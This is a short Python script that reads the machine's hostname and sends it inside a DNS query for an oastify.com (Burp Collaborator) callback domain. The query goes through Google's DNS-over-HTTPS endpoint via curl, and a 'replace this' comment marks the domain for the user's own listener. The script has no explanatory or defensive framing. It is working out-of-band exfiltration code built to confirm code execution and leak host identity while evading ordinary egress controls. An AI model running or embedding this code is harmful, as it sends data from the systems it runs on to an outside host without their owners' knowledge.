import subprocess
import base64
import socket
MY_DOMAIN = "1acum6lrmjzm3pw55u272yoz8qeh2lqa.oastify.com" # replace this
try:
    hostname_result = subprocess.run(['hostname'], capture_output=True, text=True, check=True)
    hostname = hostname_result.stdout.strip()
except subprocess.CalledProcessError:
    raise RuntimeError("Failed to retrieve hostname via system command")

full_domain = f"{hostname}.{MY_DOMAIN}"
labels = full_domain.split('.')
name_encoded = b''.join(bytes([len(label)]) + label.encode('ascii') for label in labels) + b'\x00'
header = b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
tail = b'\x00\x01\x00\x01'
msg = header + name_encoded + tail
encoded = base64.urlsafe_b64encode(msg).rstrip(b'=').decode('ascii')
url = f"https://dns.google/dns-query?dns={encoded}"
try:
    curl_result = subprocess.run(
        ['curl', '-H', 'accept: application/dns-message', url],
        capture_output=True,
        check=True
    )
    dns_response = curl_result.stdout
except subprocess.CalledProcessError as e:
    raise RuntimeError(f"Failed to execute curl command: {e}")
print(dns_response)
